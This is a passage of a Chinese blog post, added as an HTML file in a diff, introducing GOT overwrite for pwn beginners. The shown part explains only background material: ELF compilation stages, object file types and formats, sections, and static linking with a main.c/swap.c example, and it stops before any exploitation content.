@@ -1,0 +1,694 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  
+  
+  <title>深入理解GOT表覆写技术 | 江城子同学</title>
+  
+  <meta name="author" content="flyingfox" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="Got, PLT" />
+  
+  <meta name="description" content="前言玩pwn的时候，有时要用到got表覆写技术，本文在于分享对GOT表覆写技术的理解，铺垫性的基础知识较多，目的在于让初学者知其然，还要知其所以然！">
+<meta property="og:type" content="article">
+<meta property="og:title" content="深入理解GOT表覆写技术">
+<meta property="og:url" content="http://example.com/2019/09/05/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3GOT%E8%A1%A8%E8%A6%86%E5%86%99%E6%8A%80%E6%9C%AF/index.html">
+<meta property="og:site_name" content="江城子同学">
+<meta property="og:description" content="前言玩pwn的时候，有时要用到got表覆写技术，本文在于分享对GOT表覆写技术的理解，铺垫性的基础知识较多，目的在于让初学者知其然，还要知其所以然！">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://f1yingf0x-1300215590.cos.ap-chengdu.myqcloud.com/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Got%E8%A1%A8%E8%A6%86%E5%86%99%E6%8A%80%E6%9C%AF/1%E9%93%BE%E6%8E%A5%E8%A7%86%E5%9B%BE.PNG">
+<meta property="og:image" content="https://f1yingf0x-1300215590.cos.ap-chengdu.myqcloud.com/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Got%E8%A1%A8%E8%A6%86%E5%86%99%E6%8A%80%E6%9C%AF/2%E5%8F%AF%E6%89%A7%E8%A1%8C%E8%A7%86%E5%9B%BE.PNG">
+<meta property="og:image" content="https://f1yingf0x-1300215590.cos.ap-chengdu.myqcloud.com/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Got%E8%A1%A8%E8%A6%86%E5%86%99%E6%8A%80%E6%9C%AF/3%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.PNG">
+<meta property="og:image" content="https://f1yingf0x-1300215590.cos.ap-chengdu.myqcloud.com/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Got%E8%A1%A8%E8%A6%86%E5%86%99%E6%8A%80%E6%9C%AF/4%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.PNG">
+<meta property="og:image" content="https://f1yingf0x-1300215590.cos.ap-chengdu.myqcloud.com/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Got%E8%A1%A8%E8%A6%86%E5%86%99%E6%8A%80%E6%9C%AF/5%E9%93%BE%E6%8E%A5%E6%93%8D%E4%BD%9C%E7%9A%84%E6%AD%A5%E9%AA%A4.PNG">
+<meta property="og:image" content="https://f1yingf0x-1300215590.cos.ap-chengdu.myqcloud.com/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Got%E8%A1%A8%E8%A6%86%E5%86%99%E6%8A%80%E6%9C%AF/6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%9D%99%E6%80%81%E5%BA%93%E6%96%87%E4%BB%B6.PNG">
+<meta property="og:image" content="https://f1yingf0x-1300215590.cos.ap-chengdu.myqcloud.com/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Got%E8%A1%A8%E8%A6%86%E5%86%99%E6%8A%80%E6%9C%AF/7%E7%A8%8B%E5%BA%8F%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B.PNG">
+<meta property="og:image" content="https://f1yingf0x-1300215590.cos.ap-chengdu.myqcloud.com/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Got%E8%A1%A8%E8%A6%86%E5%86%99%E6%8A%80%E6%9C%AF/8.PNG">
+<meta property="og:image" content="https://f1yingf0x-1300215590.cos.ap-chengdu.myqcloud.com/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Got%E8%A1%A8%E8%A6%86%E5%86%99%E6%8A%80%E6%9C%AF/9%E6%A8%A1%E5%9D%97%E5%86%85%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%88%96%E8%B7%B3%E8%BD%AC.PNG">
+<meta property="og:image" content="https://f1yingf0x-1300215590.cos.ap-chengdu.myqcloud.com/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Got%E8%A1%A8%E8%A6%86%E5%86%99%E6%8A%80%E6%9C%AF/10%E6%A8%A1%E5%9D%97%E5%86%85%E6%95%B0%E6%8D%AE%E5%BC%95%E7%94%A8.PNG">
+<meta property="og:image" content="https://f1yingf0x-1300215590.cos.ap-chengdu.myqcloud.com/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Got%E8%A1%A8%E8%A6%86%E5%86%99%E6%8A%80%E6%9C%AF/11%E6%A8%A1%E5%9D%97%E9%97%B4%E6%95%B0%E6%8D%AE%E5%BC%95%E7%94%A8.PNG">
+<meta property="og:image" content="https://f1yingf0x-1300215590.cos.ap-chengdu.myqcloud.com/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Got%E8%A1%A8%E8%A6%86%E5%86%99%E6%8A%80%E6%9C%AF/12%E6%A8%A1%E5%9D%97%E9%97%B4%E8%B7%B3%E8%BD%AC.PNG">
+<meta property="og:image" content="https://f1yingf0x-1300215590.cos.ap-chengdu.myqcloud.com/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Got%E8%A1%A8%E8%A6%86%E5%86%99%E6%8A%80%E6%9C%AF/13%E5%88%86%E6%9E%90%E7%BB%93%E6%9E%9C.PNG">
+<meta property="article:published_time" content="2019-09-05T15:01:04.000Z">
+<meta property="article:modified_time" content="2023-07-28T08:51:33.249Z">
+<meta property="article:author" content="flyingfox">
+<meta property="article:tag" content="Got">
+<meta property="article:tag" content="PLT">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://f1yingf0x-1300215590.cos.ap-chengdu.myqcloud.com/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Got%E8%A1%A8%E8%A6%86%E5%86%99%E6%8A%80%E6%9C%AF/1%E9%93%BE%E6%8E%A5%E8%A7%86%E5%9B%BE.PNG">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" media="all"></script>
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-color-dark.min.css" media="(prefers-color-scheme: dark)"></script>
+    <script src="/js/kr-dark.min.js"></script>
+  
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" media="all"></script>
+  
+  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></script>
+  <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/aplayer@1.10.1/dist/APlayer.min.css"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"></script>
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="/vendors/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="/vendors/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+  <style>
+    
+    
+  </style>
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                    
+                                        
+                                            <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                        
+                                    
+                                        
+                                            <li><a href="/archives/"><i class="fa fa-file"></i>档案馆</a></li>
+                                        
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">江城子同学</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>江城子同学</h2> <br />
+                        <span>十年饮冰，难凉热血</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article itemscope itemtype="https://schema.org/Article">
+    
+    <link itemprop="mainEntityOfPage" href="http://example.com/2019/09/05/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3GOT%E8%A1%A8%E8%A6%86%E5%86%99%E6%8A%80%E6%9C%AF/">
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center" itemprop="name headline">深入理解GOT表覆写技术</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><time datetime="2019-09-05T15:01:04.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2019-09-05</time></li>
+                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
+                    <i class="fa fa-user"></i> 作者 <span itemprop="name">flyingfox</span>
+                </li>
+                
+                    <li>
+                        <i class="fa fa-edit"></i> 
+                        
+                        
+                            ~11.14K
+                        
+                        字
+                    </li>
+                
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                <div class="icon"><i class="fa fa-warning"></i></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1690534293249"></time> 前，其中的内容可能需要更新。</p></div>
+            </div>
+            
+            
+            
+                <div class="kratos-post-inner-toc toc-div-class" >
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ELF%E6%96%87%E4%BB%B6%E7%94%9F%E6%88%90%E8%BF%87%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">ELF文件生成过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E5%A4%84%E7%90%86%E8%BF%87%E7%A8%8B"><span class="toc-number">2.1.</span> <span class="toc-text">预处理过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B"><span class="toc-number">2.2.</span> <span class="toc-text">编译过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%87%E7%BC%96%E8%BF%87%E7%A8%8B"><span class="toc-number">2.3.</span> <span class="toc-text">汇编过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B"><span class="toc-number">2.4.</span> <span class="toc-text">链接过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%A6%82%E8%BF%B0"><span class="toc-number">3.</span> <span class="toc-text">目标文件格式概述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E7%B1%BB%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6"><span class="toc-number">3.1.</span> <span class="toc-text">三类目标文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%87%E5%87%86%E7%9A%84%E5%87%A0%E7%A7%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F"><span class="toc-number">3.2.</span> <span class="toc-text">标准的几种目标文件格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%A4%E7%A7%8D%E8%A7%86%E5%9B%BE"><span class="toc-number">3.3.</span> <span class="toc-text">两种视图</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ELF%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6"><span class="toc-number">4.</span> <span class="toc-text">ELF可重定位目标文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ELF%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6"><span class="toc-number">5.</span> <span class="toc-text">ELF可执行目标文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%A6%E5%8F%B7%E5%8F%8A%E7%AC%A6%E5%8F%B7%E8%A1%A8"><span class="toc-number">6.</span> <span class="toc-text">符号及符号表</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%93%BE%E6%8E%A5%E6%93%8D%E4%BD%9C%E7%9A%84%E6%AD%A5%E9%AA%A4"><span class="toc-number">6.1.</span> <span class="toc-text">链接操作的步骤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E5%92%8C%E7%AC%A6%E5%8F%B7%E8%A7%A3%E6%9E%90"><span class="toc-number">7.</span> <span class="toc-text">静态链接和符号解析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84%E5%8A%A0%E8%BD%BD"><span class="toc-number">8.</span> <span class="toc-text">可执行文件的加载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B1%E4%BA%AB%E5%BA%93%E5%92%8C%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E3%80%90%E5%88%92%E9%87%8D%E7%82%B9%E3%80%91"><span class="toc-number">9.</span> <span class="toc-text">共享库和动态链接【划重点】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5%E9%83%A8%E5%88%86"><span class="toc-number">10.</span> <span class="toc-text">实践部分</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">11.</span> <span class="toc-text">参考资料</span></a></li></ol>
+                </div>
+            
+            <hr />
+            <div itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>玩<code>pwn</code>的时候，有时要用到<code>got</code>表覆写技术，本文在于分享对<code>GOT</code>表覆写技术的理解，铺垫性的基础知识较多，目的在于让初学者知其然，还要知其所以然！</p>
+<span id="more"></span>
+
+<h2 id="ELF文件生成过程"><a href="#ELF文件生成过程" class="headerlink" title="ELF文件生成过程"></a>ELF文件生成过程</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hello.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello World!n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//执行指令:$gcc hello.c -o hello</span></span><br></pre></td></tr></table></figure>
+
+<p>注：<code>gcc</code>命令实际上是具体程序（如<code>ccp</code>、<code>cc1</code>、<code>as</code>等）的包装命令，用户通过<code>gcc</code>命令来使用具体的预处理程序<code>ccp</code>、编译程序<code>cc1</code>和汇编程序<code>as</code>等。</p>
+<h3 id="预处理过程"><a href="#预处理过程" class="headerlink" title="预处理过程"></a>预处理过程</h3><p>主要处理源文件中以<code>“#”</code>开头的预编译指令，经过预编译处理后，得到的是预处理文件（如，<code>hello.i</code>) ，它还是一个可读的文本文件 。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$gcc –E hello.c –o hello.i</span><br></pre></td></tr></table></figure>
+
+<h3 id="编译过程"><a href="#编译过程" class="headerlink" title="编译过程"></a>编译过程</h3><p>将预处理后得到的预处理文件（如 <code>hello.i</code>）进行词法分析、语法分析、语义分析、优化后，生成汇编代码文件。经过编译后，得到的汇编代码文件（如 <code>hello.s</code>）还是可读的文本文件，<code>CPU</code>无法理解和执行它。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$gcc –S hello.i –o hello.s <span class="comment">//或者$gcc –S hello.c –o hello.s</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="汇编过程"><a href="#汇编过程" class="headerlink" title="汇编过程"></a>汇编过程</h3><p>汇编程序（汇编器）用来将汇编语言源程序转换为机器指令序列（机器语言程序）。汇编结果是一个可重定位目标文件（如 <code>hello.o</code>），其中包含的是不可读的二进制代码，必须用相应的工具软件来查看其内容。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$gcc –c hello.s –o hello.o  <span class="comment">//或者$gcc –c hello.c –o hello.o</span></span><br></pre></td></tr></table></figure>
+
+<p>预处理、编译和汇编三个过程针对一个模块（一个*<code>.c</code>文件）进行处理，得到对应的一个可重定位目标文件（一个*<code>.o</code>文件）。</p>
+<h3 id="链接过程"><a href="#链接过程" class="headerlink" title="链接过程"></a>链接过程</h3><p>将多个可重定位目标文件合并以生成可执行目标文件</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">链接过程指令较复杂，此处不详细说明，具体可以参考《程序员的自我修养》第二章</span><br></pre></td></tr></table></figure>
+
+<h2 id="目标文件格式概述"><a href="#目标文件格式概述" class="headerlink" title="目标文件格式概述"></a>目标文件格式概述</h2><h3 id="三类目标文件"><a href="#三类目标文件" class="headerlink" title="三类目标文件"></a>三类目标文件</h3><p>1、<strong>可重定位目标文件 (<code>Relocatable File</code>; 后缀名为<code>“.o”</code>)</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>) Linux下的.o（Windows下的.obj）;</span><br><span class="line"><span class="number">2</span>) 包含代码和数据，可被用来链接成可执行文件或共享目标文件，静态链接库也可以归为这一类;</span><br><span class="line"><span class="number">3</span>) 每个.o 文件由对应的.c文件生成;</span><br><span class="line"><span class="number">4</span>) 每个.o文件代码和数据地址都从<span class="number">0</span>开始;</span><br></pre></td></tr></table></figure>
+
+<p>2、<strong>可执行目标文件(<code>Executable File</code>；一般没有后缀名)</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>) 包含的代码和数据可以被直接复制到内存并被执行</span><br><span class="line"><span class="number">2</span>) 代码和数据地址为虚拟地址空间中的地址</span><br></pre></td></tr></table></figure>
+
+<p>3、<strong>共享的目标文件 (<code>Shared Object File</code>；后缀名为<code>“.so”</code>)</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>) 链接器可使用.so文件跟其他.o文件和.so文件链接以生成新的.o文件</span><br><span class="line"><span class="number">2</span>) 动态链接器将几个.so文件与可执行文件结合，作为进程映像的一部分来运行</span><br><span class="line"><span class="number">3</span>) 特殊的可重定位目标文件，能在装入或运行时被装入到内存并自动被链接，称为共享库文件</span><br><span class="line"><span class="number">4</span>) Windows 中称其为 Dynamic Link <span class="title function_">Libraries</span> <span class="params">(DLLs)</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="标准的几种目标文件格式"><a href="#标准的几种目标文件格式" class="headerlink" title="标准的几种目标文件格式"></a>标准的几种目标文件格式</h3><ol>
+<li><code>DOS</code>操作系统（最简单） ：<strong>COM格式</strong>，文件中仅包含代码和数据，且被加载到固定位置；</li>
+<li><code>System V UNIX</code>早期版本：<strong>COFF格式</strong>，文件中不仅包含代码和数据，还包含重定位信息、调试信息、符号表等其他信息，由一组严格定义的数据结构序列组成；</li>
+<li><code>Windows</code>： <strong>PE格式（COFF的变种）</strong>，称为可移植可执行(<code>Portable Executable</code>，简称<code>PE</code>)；<br>4)<code>Linux</code>等类<code>UNIX</code>：<strong>ELF格式（COFF的变种）</strong>，称为可执行可链接(<code>Executable and Linkable Format</code>，简称<code>ELF</code>)；</li>
+</ol>
+<h3 id="两种视图"><a href="#两种视图" class="headerlink" title="两种视图"></a>两种视图</h3><p><strong>链接视图（被链接）</strong>：可重定位目标文件<code>(Relocatable object files)</code></p>
+<p><img src="https://f1yingf0x-1300215590.cos.ap-chengdu.myqcloud.com/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Got%E8%A1%A8%E8%A6%86%E5%86%99%E6%8A%80%E6%9C%AF/1%E9%93%BE%E6%8E%A5%E8%A7%86%E5%9B%BE.PNG" alt="1"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>) 可被链接（合并）生成可执行文件或共享目标文件</span><br><span class="line"><span class="number">2</span>) 包含代码、数据（已初始化.data和未初始化.bss）</span><br><span class="line"><span class="number">3</span>) 包含重定位信息（指出哪些符号引用处需要重定位）</span><br><span class="line"><span class="number">4</span>) 文件扩展名为.o（相当于Windows中的 .obj文件）</span><br></pre></td></tr></table></figure>
+
+<p><strong>执行视图（被执行）</strong>：可执行目标文件（<code>Executable object files</code>）</p>
+<p><img src="https://f1yingf0x-1300215590.cos.ap-chengdu.myqcloud.com/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Got%E8%A1%A8%E8%A6%86%E5%86%99%E6%8A%80%E6%9C%AF/2%E5%8F%AF%E6%89%A7%E8%A1%8C%E8%A7%86%E5%9B%BE.PNG" alt="2"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>) 定义的所有变量和函数已有确定地址（虚拟地址空间中的地址）</span><br><span class="line"><span class="number">2</span>) 符号引用处已被重定位，以指向所引用的定义符号</span><br><span class="line"><span class="number">3</span>) 没有文件扩展名或默认为a.out（相当于Windows中的 .exe文件）</span><br><span class="line"><span class="number">4</span>) 可被CPU直接执行，指令地址和指令给出的操作数地址都是虚拟地址</span><br></pre></td></tr></table></figure>
+
+<h2 id="ELF可重定位目标文件"><a href="#ELF可重定位目标文件" class="headerlink" title="ELF可重定位目标文件"></a>ELF可重定位目标文件</h2><p><img src="https://f1yingf0x-1300215590.cos.ap-chengdu.myqcloud.com/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Got%E8%A1%A8%E8%A6%86%E5%86%99%E6%8A%80%E6%9C%AF/3%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.PNG" alt="3"></p>
+<p><strong>.bss 节</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C语言规定: 未初始化的全局变量和局部静态变量的默认初始值为<span class="number">0</span></span><br><span class="line">将未初始化变量（.bss节）与已初始化变量（.data节）分开的好处</span><br><span class="line">    <span class="number">1</span>) .data节中存放具体的初始值，需要占磁盘空间</span><br><span class="line">    <span class="number">2</span>) .bss节中无需存放初始值,只要说明.bss中的每个变量将来在执行时占用几个字节即可,因此,.bss节实际上不占用磁盘空间,提高了磁盘空间利用率</span><br><span class="line">所有未初始化的全局变量和局部静态变量都被汇总到.bss节中，通过专门的节头表(Section,header,table)来说明应该为.bss节预留多大的空间</span><br></pre></td></tr></table></figure>
+
+<h2 id="ELF可执行目标文件"><a href="#ELF可执行目标文件" class="headerlink" title="ELF可执行目标文件"></a>ELF可执行目标文件</h2><p><img src="https://f1yingf0x-1300215590.cos.ap-chengdu.myqcloud.com/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Got%E8%A1%A8%E8%A6%86%E5%86%99%E6%8A%80%E6%9C%AF/4%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.PNG" alt="4"></p>
+<h2 id="符号及符号表"><a href="#符号及符号表" class="headerlink" title="符号及符号表"></a>符号及符号表</h2><h3 id="链接操作的步骤"><a href="#链接操作的步骤" class="headerlink" title="链接操作的步骤"></a>链接操作的步骤</h3><p><img src="https://f1yingf0x-1300215590.cos.ap-chengdu.myqcloud.com/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Got%E8%A1%A8%E8%A6%86%E5%86%99%E6%8A%80%E6%9C%AF/5%E9%93%BE%E6%8E%A5%E6%93%8D%E4%BD%9C%E7%9A%84%E6%AD%A5%E9%AA%A4.PNG" alt="5"></p>
+<p><strong>Step 1. 符号解析（Symbol resolution）</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>) 确定程序中有定义和引用的符号 (包括变量和函数等)</span><br><span class="line"><span class="number">2</span>) 将定义的符号存放在一个符号表（ symbol table）中.</span><br><span class="line">        符号表是一个结构数组</span><br><span class="line">        每个表项包含符号名、长度和位置等信息</span><br><span class="line"><span class="number">3</span>) 将每个符号的引用都与一个确定的符号定义建立关联</span><br></pre></td></tr></table></figure>
+
+<p><strong>Step 2. 重定位</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>) 合并相同的节：将集合E中所有目标模块中相同的节分别合并为一个新节;</span><br><span class="line"><span class="number">2</span>) 对定义符号进行重定位：确定新节中所有定义符号在虚拟地址空间中的绝对地址，完成这一步后，每条指令和每个全局或局部变量都可确定地址;</span><br><span class="line"><span class="number">3</span>) 对引用符号进行重定位：将可执行文件中符号引用处的地址修改为重定位后的地址信息.需要用到在.rel_data和.rel_text节中保存的重定位信息;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.c</span></span><br><span class="line"><span class="type">int</span> buf[<span class="number">2</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    swap();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//swap.c</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> buf[];</span><br><span class="line"><span class="type">int</span> *bufp0 = &amp;buf[<span class="number">0</span>];</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> *bufp1;</span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> temp;</span><br><span class="line">    bufp1 = &amp;buf[<span class="number">1</span>];</span><br><span class="line">    temp = *bufp0;</span><br><span class="line">    *bufp0 = *bufp1;</span><br><span class="line">    *bufp1 = temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>链接符号的类型</strong><br>每个可重定位目标模块<code>m</code>都有一个符号表，它包含了在<code>m</code>中定义和引用的符号。有三种链接器符号：</p>
